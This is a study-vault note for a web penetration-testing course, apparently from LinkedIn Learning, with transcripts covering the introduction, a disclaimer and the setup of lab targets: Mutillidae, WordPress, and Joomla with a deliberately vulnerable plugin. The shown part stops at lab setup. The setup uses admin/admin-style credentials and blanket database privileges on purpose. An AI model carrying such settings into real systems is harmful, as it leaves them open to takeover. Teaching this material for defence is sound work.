---
type: course
cssclasses:
  - lle-course
  - lle-level-advanced
slug: penetration-testing-web-apps-with-kali-and-burp-suite
url: "https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite"
duration_minutes: 114
duration: 1h 54m
level: Advanced
updated: 9/29/2022
learners: 31944
skills:
  - Penetration Testing
exercise_files: false
thumbnail: "https://media.licdn.com/dms/image/v2/C4E0DAQEkWyYAAMz_-A/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1664314084893?e=2147483647&amp;v=beta&amp;t=PNGaWMiPQSNBxKI25IfN99PKNRUttTeopw1cxPrXQR0"
linkedin_topic: Cybersecurity
learning_paths:
  - '[[Become a Penetration Tester]]'
prev_courses:
  - '[[Kali Linux for Advanced Pen Testing and Ethical Hacking]]'
next_courses:
  - '[[Advanced Pen Testing Techniques for Active Directory]]'
path_nav: '[{"path":"Become a Penetration Tester","position":5,"total":8,"prev":"Kali Linux for Advanced Pen Testing and Ethical Hacking","next":"Advanced Pen Testing Techniques for Active Directory"}]'
path_count: 1
tags:
  - course
  - topic/security
  - skill/penetration-testing
status: not-started
created: 2026-04-29
---

> <!-- lle:github-source --> [View this note on GitHub](https://github.com/thisis-romar/linkedin-learning-vault/blob/github-browse/Courses/Cybersecurity/Penetration%20Testing%20Web%20Apps%20with%20Kali%20and%20Burp%20Suite.md)

![Penetration Testing Web Apps with Kali and Burp Suite](https://media.licdn.com/dms/image/v2/C4E0DAQEkWyYAAMz_-A/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1664314084893?e=2147483647&amp;v=beta&amp;t=PNGaWMiPQSNBxKI25IfN99PKNRUttTeopw1cxPrXQR0)

# Penetration Testing Web Apps with Kali and Burp Suite

> Websites are one of the most vulnerable pieces of information technology, since their contents are exposed to access from the internet. By understanding how attackers locate and exploit these vulnerabilities, you can help build more secure websites and protect web applications. This course shows you how to perform advanced web testing using the tools available in Kali, the professional pen testing

> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite) | 1h 54m | Advanced | 32K learners
> [Jump to Path Context ↓](#path-context)

## Table of Contents

### Chapter Overview

- **[[#Introduction]]** (3 videos)
- **[[#1. Setting Up]]** (4 videos)
- **[[#2. Refresher]]** (3 videos)
- **[[#3. Advanced Website Enumeration]]** (3 videos)
- **[[#4. Finding Vulnerabilities]]** (2 videos)
- **[[#5. Attacking the Website]]** (9 videos)
- **[[#6. Content Management]]** (4 videos)
- **[[#Conclusion]]** (1 videos)

### Introduction

> [[#Table of Contents|↑ Back to Table of Contents]]

#### Protecting your websites
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=0)** - [Malcolm Shore] With the dominance of Cloud and software as a service delivery, web portals are now the standard means of accessing applications.
>
> **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=9)** These applications might be static HTML servers, serving up information that changes only when the website is updated.
>
> **[0:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=16)** They may be active servers running one or more of many different active languages.
>
> **[0:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=23)** They may be content management systems providing easily scripted web content through one of a number of CMS solutions.
>
> **[0:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=31)** I'm Malcolm Shore and I've spent a career helping governments and businesses protect their networks and systems against cyber attacks.
>
> **[0:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=40)** In this course, we'll be using a variety of advanced web tools and technologies.
>
> **[0:45](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=45)** We'll start by looking at the tools that we can use to enumerate the web platform.
>
> **[0:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=51)** We'll see how we can gain access to information on the server and in its backend databases.
>
> **[0:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=57)** And how to achieve command shells to take control of the web server.
>
> **[1:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=62)** Once you complete the course, you'll be armed with the knowledge and exploit techniques needed as a professional web pen tester.
>
> **[1:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=70)** Now, let's get started with advanced web testing.

> [!info]- Semantic Content
>
> **Code Keywords:** static (1), let (1)
> **Env Vars:** html (1), cms (1)
> **Speakers:** - [malcolm (1)

#### What you should know before watching this course
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=0)** - [Instructor] This is a practical course.
>
> **[0:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=2)** And during this course, we'll be using the Kali Linux-based tools to do testing.
>
> **[0:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=8)** We'll be testing against web applications in the offensive security and Hack The Box online penetration testing labs.
>
> **[0:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=15)** Together, these provide a range of sophisticated web-based applications for us to test.
>
> **[0:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=22)** Where possible, we'll use the free subscription targets in these labs, but some of the more complex targets will be in the main labs.
>
> **[0:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=30)** We'll also be using the OWASP Utility Dive Vulnerable Web Application, which we can run on our local test network.
>
> **[0:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=39)** You should be competent in Windows and Unix host technologies, as well as having a good grasp of network protocols.
>
> **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=46)** A good understanding of HTTP would be an advantage.
>
> **[0:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=51)** You'll need to have a good working knowledge of Kali and some hands-on experience of testing.
>
> **[0:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=57)** You should have a working knowledge of web testing tools, in particular, Burp Suite, and you should have taken the Ethical Hacking: Web Servers and Applications course.
>
> **[1:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=68)** You should have a basic knowledge of scripting languages, such as PHP and Python.
>
> **[1:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=74)** You should be able to install third-party tools and applications that we'll use in our testing.

> [!info]- Semantic Content
>
> **Env Vars:** owasp (1), http (1), php (1)
> **CLI Commands:** php (1), python (1)
> **Prerequisites:** you'll need (1), install (1)
> **Definitions:** is a  (1)
> **Analogies:** such as (1)
> **Speakers:** - [instructor] (1)

#### Disclaimer
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980&t=0)** - [Instructor] This is one of a series of advanced pen testing courses.
>
> **[0:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980&t=4)** And in addition to Kali Linux, it uses some third-party commercial and open-source testing software.
>
> **[0:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980&t=11)** While we've done our best to ensure that the tools we use and the sites we reference are legitimate, testing sites can be targets for hackers and we can't provide any assurance that these sites might not be compromised when you visit them.
>
> **[0:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980&t=24)** Some of the sites which store the testing tools are detected as dangerous because the tools have similar signatures to malware and may raise antivirus alerts when you visit them.
>
> **[0:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980&t=36)** The testing tools we demonstrate are extremely powerful.
>
> **[0:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980&t=40)** They may demonstrate some of the same signature characteristics as malware and malicious implants, and may raise antivirus alerts when you try to download them.
>
> **[0:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980&t=49)** Again, we can't provide assurance that the software hasn't been compromised when you download it.
>
> **[0:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980&t=55)** And so, as for any other software from the internet, you need to exercise due diligence and take personal responsibility for anything you load into your system.
>
> **[1:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980&t=65)** Our testing is mostly carried out inside a virtual environment to contain any unplanned effects of testing tools and in the unlikely event that you download malware, this will also help contain any impact.

> [!info]- Semantic Content
>
> **Code Keywords:** raise (2)
> **Speakers:** - [instructor] (1)


### 1. Setting Up

> [[#Table of Contents|↑ Back to Table of Contents]]

#### Preparing the test environment
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=0)** - [Instructor] During this course we'll be using a number of web applications.
>
> **[0:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=4)** Some of these will be available in the Offensive Security and Hack The Box online testing labs.
>
> **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=9)** But some of them we'll have running locally on our own test network.
>
> **[0:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=15)** We can run a physical server on our home network.
>
> **[0:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=18)** We can set up a virtual machine in a Virtual Box or VMware environment.
>
> **[0:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=23)** Or we can run a VM on a home data center solution, such as Proxmox.
>
> **[0:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=29)** It makes no difference which environment we run our Virtual Machines in.
>
> **[0:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=33)** So it's personal choice.
>
> **[0:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=36)** We'll be using the Metasploitable system that we used in our web systems and web applications course for our refresher on web testing.
>
> **[0:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=44)** This offers a number of web targets.
>
> **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=46)** Including an early version of mutillidae.
>
> **[0:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=49)** There's a more recent version of mutillidae which we can load and use.
>
> **[0:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=54)** It runs on a LAMP Stack web server, MariaDB, Apache, and PHP on top of Linux.
>
> **[1:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=61)** I've prepared a standard LAMP Stack server.
>
> **[1:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=63)** So let's install mutillidae II.
>
> **[1:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=66)** The first thing we need to do is set up an account for mutillidae.
>
> **[1:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=70)** We can do this easily enough.
>
> **[1:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=71)** Let's SSH into our LAMP server.
>
> **[1:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=76)** SSH and I'll use the account ubuntu@192.168.1.176.
>
> **[1:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=85)** That's my lamp server.
>
> **[1:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=88)** And let's open SQL.
>
> **[1:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=90)** Sudo mysql minus U, route.
>
> **[1:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=97)** And we'll set up the account we'll use from mutillidae.
>
> **[1:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=101)** Create user mutillidae@localhost
>
> **[1:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=114)** identified by the password mutillidae.
>
> **[2:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=121)** And we'll grant all privileges on star-dot-star to mutillidae@local host.
>
> **[2:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=140)** And we'll flush privileges and exit.
>
> **[2:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=149)** Now let's clone the mutillidae application.
>
> **[2:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=152)** CD/var/www/html.
>
> **[2:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=158)** Sudo git clone [https://github.com/webpwnized/mutillidae.git](https://github.com/webpwnized/mutillidae.git)
>
> **[2:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=177)** and we'll update the account details.
>
> **[3:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=180)** CD mutillidae/includes and sudo nano database-config.inc.
>
> **[3:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=195)** And we'll change the username to mutillidae.
>
> **[3:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=201)** Okay, that's it.
>
> **[3:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=202)** So we can leave the server now and we can browse to mutillidae.
>
> **[3:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=210)** 192.168.1.176/mutillidae
>
> **[3:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=219)** and we'll select click here to set up the database.
>
> **[3:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=224)** Okay, we've now set up mutillidae and we've got a server we can test against.
>
> **[3:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=230)** We'll add additional web applications to this server as we progress through the course.

> [!info]- Semantic Content
>
> **CLI Commands:** sudo (3), ssh (2), cd (2), git (2), apache (1)
> **Env Vars:** lamp (3), ssh (2), php (1), sql (1)
> **Prerequisites:** set up (5), install (1)
> **Code Keywords:** let (4), var (1)
> **Versions:** 192.168.1 (2)
> **URLs:** [https://github.com/webpwnized/mutillidae.git](https://github.com/webpwnized/mutillidae.git) (1)
> **Tools:** github (1)
> **Analogies:** such as (1)

#### Setting up WordPress
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=0)** - In order to support our testing of content management systems, we'll set up the WordPress CMS on our lamp server.
>
> **[0:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=7)** I've SSHD into it.
>
> **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=9)** So let's get started.
>
> **[0:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=11)** The first thing we'll do is to go into my SQL and add the WordPress databases, sudo my SQL minus U route, and will create database WordPress.
>
> **[0:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=34)** Let's also add an administrator account that we can use for CMS support.
>
> **[0:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=40)** Create user support at local host identified by support grant all privileges on Startup Star to support at Local host and we can flush privileges and exit.
>
> **[1:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=80)** So let's load WordPress now.
>
> **[1:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=82)** We can use curl to download it into our temp folder For the moment CD slash TMP, curl minus o https [wordpress.org](https://wordpress.org), latest dot tar dot g said And we'll use tar to un zip it.
>
> **[1:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=109)** Tar xzvf latest dot tar dot gz.
>
> **[1:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=119)** We need to set up the configuration file for WordPress.
>
> **[2:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=123)** We'll start by downloading the official salt value curl https api.[wordpress.org](https://wordpress.org).
>
> **[2:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=136)** Secret key 1.1 salt two WordPress slash WP dash config dot php.
>
> **[2:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=154)** And then we'll add to it the rest of the PHP file nano WordPress slash WP dash config dot php.
>
> **[2:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=171)** We'll add the PHP header at the start php and at the end we'll add the remaining PHP configuration lines.
>
> **[3:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=182)** Define DB underscore name WordPress define DB underscore user support define DB underscore password support define DB underscore host local host
>
> **[3:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=233)** define DB underscore charset.
>
> **[4:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=241)** UTF8 Define DB collate.
>
> **[4:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=253)** Well leave that blank.
>
> **[4:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=258)** Define FS method Direct.
>
> **[4:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=274)** Define WP de Bug false, and we'll set the table prefix to WP underscore.
>
> **[4:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=297)** And if not defined, ABSPATH.
>
> **[5:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=309)** Define ABSPATH underscore underscore dir dot backslash and require once ABSPATH WP Settings dot php.
>
> **[5:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=339)** And close the PHP file and save it.
>
> **[5:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=347)** Now let's move this into the web home folder.
>
> **[5:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=350)** sudo move WordPress to slash war slash www slash html slash WordPress and we'll set up the ownership and permissions sudo chown www data.
>
> **[6:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=374)** Www data sudo chown minus R WW data WW data slash war slash www slash html slash WordPress and sudo chard minus R 7 55 slash war slash www slash html slash WordPress.
>
> **[6:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=408)** The final change we need to make is to increase the maximum upload size in PHP from two meg to eight meg nano slash etcetera
>
> **[7:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=421)** sudo nano slash etcetera slash php slash 7.4 slash apache two slash php dot ini.
>
> **[7:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=436)** And well look for two M and change that to eight.
>
> **[7:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=446)** Okay, let's finish the installation of WordPress by browsing to the home folder.
>
> **[7:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=453)** We'll keep with English and we'll use Cybex as the site title and set the username and password to admin.
>
> **[7:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=474)** And we'll set the email to admin@[cybex.com](https://cybex.com) and we can now install WordPress.

> [!info]- Semantic Content
>
> **CLI Commands:** php (11), sudo (6), tar (4), curl (3), chown (2)
> **Env Vars:** php (5), abspath (3), cms (2), sql (2), sshd (1)
> **Code Keywords:** let (5), require (1)
> **URLs:** [wordpress.org](https://wordpress.org) (2), [cybex.com](https://cybex.com) (1)
> **Prerequisites:** set up (2), install (1)
> **Versions:** 1.1 (1), 7.4 (1)
> **Speakers:** - in (1)

#### Setting up Joomla
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=0)** - Let's install Joomla as a second content management system that we can test.
>
> **[0:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=5)** I'm logged into our local server, so we'll start our setup of Joomla by adding its database to mysql.
>
> **[0:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=13)** "sudo mysql -u root" And we'll "create database joomla_db;"
>
> **[0:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=29)** and "exit".
>
> **[0:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=32)** Let's download Joomla into the tmp folder.
>
> **[0:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=36)** So we'll "cd /tmp" and "wget [https://downloads.joomla.org](https://downloads.joomla.org)/
>
> **[0:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=51)** cms/ joomla3/ 3-5-0/ Joomla_3.5.0-Stable-Full_Package.zip"
>
> **[1:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=76)** and we'll output that to just joomla.zip.
>
> **[1:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=83)** Okay, let's make a webroot folder and we'll unzip into it.
>
> **[1:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=88)** "sudo mkdir /var/www/html/joomla",
>
> **[1:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=100)** and "sudo unzip joomla.zip -d"
>
> **[1:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=108)** and destination folder will be "/var/www/html/joomla".
>
> **[1:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=118)** And we'll set the ownership to the web account: "sudo chown" recursively, "www-data:www-data/var/ www/html/joomla".
>
> **[2:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=140)** Okay, Joomla's now ready to be set up via its web interface.
>
> **[2:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=146)** We'll browse to the Joomla homepage, 192.168.1.176/joomla.
>
> **[2:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=158)** We'll set the site name to "Cybex" and the Administrator Email to "admin@[cybex.com](https://cybex.com)".
>
> **[2:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=170)** We'll use admin as the administration account and set the password to admin as well.
>
> **[3:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=182)** And we can click Next.
>
> **[3:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=186)** We'll set the database username to "support", as we've set up previously, and the database name, as we've set up, to "joomla_db".
>
> **[3:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=201)** And we'll put "jm_" as the table prefix.
>
> **[3:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=205)** Okay, we can now install, and we can finish by removing the installation folder.
>
> **[3:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=216)** Joomla allows us to load plugin applications.
>
> **[3:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=219)** One such application is "jssupportticket".
>
> **[3:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=224)** A number of bugs have been found in jssupportticket.
>
> **[3:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=228)** Let's go into Joomla and we'll upload a vulnerable version of the jssupportticket plugin.
>
> **[3:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=234)** I've already downloaded this onto the server, so we can upload it directly.
>
> **[3:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=239)** Let's log in with our admin credentials: "admin", "admin".
>
